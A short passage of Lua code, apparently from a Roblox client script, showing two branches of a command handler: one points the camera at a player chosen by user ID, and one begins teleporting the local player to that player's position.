        local target = Players:GetPlayerByUserId(tonumber(data))
        if target then
            Camera.CameraSubject = target.Character and target.Character:FindFirstChild("HumanoidRootPart") or target.Character
        end
        
    elseif cmd == "TP_TO" then
        local target = Players:GetPlayerByUserId(tonumber(data))
        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if target and target.Character and root then
            local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
